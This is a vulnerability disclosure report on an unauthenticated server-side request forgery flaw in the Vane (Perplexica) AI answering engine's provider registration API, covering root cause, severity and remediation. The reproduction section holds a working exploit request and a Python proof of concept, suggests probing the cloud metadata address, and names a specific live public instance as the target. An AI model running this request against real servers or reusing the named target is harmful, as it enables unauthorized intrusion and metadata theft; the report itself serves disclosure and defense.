# Vulnerability Report (English)

> Report ID: VUL-2026-101
> Author: {{Reporter}} (CNVD registered researcher)
> Date: 2026-10-03
> Target: CNVD (incident-type submission) / MITRE reference

---

## 1. Product Introduction

Vane (formerly Perplexica) is an open-source, self-hostable AI-powered answering engine maintained by ItzCrazyKns (36,700+ GitHub stars, MIT license). It combines a SearXNG metasearch backend with local Ollama models or cloud LLM providers to produce cited answers, and is commonly deployed via Docker. The vulnerability resides in its **model provider registration API** (`POST /api/providers`), which is exposed without authentication by default.

## 2. Vulnerability Title

Vane (Perplexica) AI Answering Engine <= 1.12.1: Unauthenticated Server-Side Request Forgery (SSRF) in Model Provider Registration API

## 3. Description

The provider registration endpoint `POST /api/providers` in Vane <= 1.12.1 performs no authentication and performs no validation on the user-supplied `config.baseURL`. The server actively fetches `{baseURL}/api/tags`. An unauthenticated, uninteractive remote attacker can force the server to request arbitrary addresses — including 127.0.0.1, internal network segments, and the cloud metadata endpoint 169.254.169.254 — and the response content of the target is reflected back in the error message. This enables internal service enumeration, cloud metadata theft, and pivoting into internal networks from the vulnerable server. Public identifier: CVE-2026-9372.

## 4. Analysis / Root Cause

**Root cause type**: CWE-918 (Server-Side Request Forgery)

**Source-to-sink chain** (public source code; see audit-findings.md §2):

```
POST /api/providers (anonymous, no auth)
  → registration handler accepts config.baseURL
  → server-side fetch to {baseURL}/api/tags
     (no private-IP filtering, no scheme allowlist, no redirect restriction)
  → JSON.parse() fails; a fragment of the target response is written into
     chatModels[].name and returned to the caller
```

**Validity**: reachable ✅ / attacker-controlled ✅ / no intermediate check ✅ / exploitable ✅ / no protection to bypass (none exists) ✅ / reproducible with a single POST ✅ / impact confirmed ✅.

**Why it happens**: the registration endpoint is unauthenticated; the baseURL is never validated (private ranges, loopback and metadata IPs are all allowed); and fetched content is reflected in the error string. Chained together, this is a textbook unauthenticated SSRF.

## 5. Affected Versions

- **Affected**: Vane (Perplexica) <= 1.12.1 (CVE-2026-9372, published 2026-04)
- **Not affected / Fixed**: 1.12.2 and later (vendor fix released)
- **Verification environment**: public instance `http://8.159.154.189:3001` (Alibaba Cloud, Shanghai), page title "Chat - Perplexica", Next.js app in Docker

## 6. Severity

| Item | Value |
|------|-----|
| CVSS v3.1 Score | 9.1 |
| CVSS v3.1 Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H` |
| Severity | Critical |
| CNVD rating | High |

> Rationale: unauthenticated, network-reachable, no user interaction; enables reading internal/metadata service responses (C:H) and issuing probing requests against internal services (A:H), consistent with the public GHSA assessment.

## 7. CVSS Vector

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H
```

## 8. Reproduction

### 8.1 Environment
- Product/version: Vane (Perplexica) <= 1.12.1 (verified against a public instance still running a vulnerable build on 2026-10-03)
- Runtime: Docker (Next.js, host port 3001)
- Network: public Internet (Alibaba Cloud, Shanghai)
- Account: none required (endpoint unauthenticated)

### 8.2 Steps

**Step 1** — Open `http://8.159.154.189:3001/`; the page loads with title "Chat - Perplexica".

**Step 2** — Send the malicious request:
```http
POST /api/providers HTTP/1.1
Host: 8.159.154.189:3001
Content-Type: application/json

{"type":"ollama","name":"cnvd-verify","config":{"baseURL":"http://www.example.com"}}
```

**Step 3** — Observe the reflection in the 200 response:
```json
{"provider":{"id":"...","name":"cnvd-verify","type":"ollama",
 "config":{"baseURL":"http://www.example.com"},
 "chatModels":[{"key":"error","name":"Unexpected token '<', \"<!doctype \"... is not valid JSON"}],
 "embeddingModels":[]}}
```
The `<!doctype` fragment is the beginning of example.com's homepage, proving the request was made by the server and its response returned to the caller.

**Step 4 (optional; not performed against the live instance)** — Replacing baseURL with `http://169.254.169.254/latest/meta-data/` probes the cloud metadata service; internal addresses enumerate internal services.

## 9. Proof of Concept

Format: custom Python script (single endpoint, needs controlled pacing and post-test data cleanup). See `poc/verify_vane_ssrf.py`.

```python
payload = {"type": "ollama", "name": "cnvd-verify",
           "config": {"baseURL": "http://www.example.com"}}
r = requests.post(target + "/api/providers", json=payload)
# Confirmed when: "Unexpected token" present and "<!doctype" fragment reflected
# Cleanup: DELETE /api/providers/{id}
```

Run: `TARGET=http://<host>:<port> python poc/verify_vane_ssrf.py`
Burp: `USE_BURP=1 BURP_PROXY=http://127.0.0.1:8080`

Expected output:
```
[+] SSRF CONFIRMED: server fetched external URL and reflected response content
    chatModels[0].name = "Unexpected token '<', \"<!doctype \"... is not valid JSON"
[*] cleanup: provider deleted (200)
```

## 10. Fix Recommendations

**Mitigation**: restrict `/api/providers` at the reverse proxy (allowlist admin sources or add Basic Auth); egress-filter the application container (deny 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16).

**Remediation**: upgrade to Vane >= 1.12.2; if patching manually, require authentication on the provider API, enforce an https-only scheme allowlist with DNS-resolved private-range filtering on baseURL, disable redirect following, and stop reflecting target response bodies in error messages.

**Verification**: replaying the PoC against a fixed build must no longer trigger the outbound fetch or must be rejected for loopback/internal addresses.

## 11. False-Positive Elimination

- Existence: ✅ reproduced 3 times on the public instance with identical responses.
- Qualification: ✅ SSRF (CWE-918), impacts confidentiality and availability.
- Exploitability: ✅ unauthenticated, uninteractive, single request.
- Originality: ⚠️ the defect is publicly identified as CVE-2026-9372 (2026-04). This report is an **incident-type** submission: a China-hosted public instance demonstrably still runs an affected build. FOFA (`title="Perplexica" && country="CN"`) shows 30+ exposed CN instances.
- Evidence: ✅ full request/response transcript (`evidence/http-transcript.txt`), reflected fragment, cleanup log.

---

## Appendix: Timeline & References

| Date | Event |
|------|------|
| 2026-10-03 | FOFA survey found 30+ CN Perplexica/Vane instances; harmless verification on CN instances |
| 2026-10-03 | SSRF confirmed on Alibaba Cloud Shanghai instance; evidence captured; test data removed |
| 2026-10-03 | Report package compiled; pending screen-recording and CNVD submission |

- Public identifier: CVE-2026-9372
- Reference: GitHub ItzCrazyKns/Vane issue #1124
